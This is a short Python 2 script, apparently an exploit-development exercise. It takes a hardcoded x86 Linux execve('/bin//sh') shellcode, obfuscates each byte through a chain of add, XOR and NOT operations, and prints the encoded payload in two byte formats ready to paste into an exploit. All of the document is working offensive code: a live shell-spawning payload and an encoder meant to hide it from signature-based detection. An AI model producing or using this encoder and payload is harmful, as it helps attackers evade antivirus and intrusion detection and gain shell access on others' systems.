#!/usr/bin/python

# Python custom encoder 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	x = x + 0x05 # add 5 to x
	x = x^0xBB # xor encode x with 0xBB
	x = x + 0x0A # add 10 to x
	x = x^0xCC # xor encode x with 0xCC
	x = ~x # not encode x
	x = x & 0xff # make the not encoded x positive
	x = x^0xA9 # xor encode x with 0xA9

	encoded += '\\x'
	encoded += '%02x' % x

	encoded2 += '0x'
	encoded2 += '%02x,' %x

print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
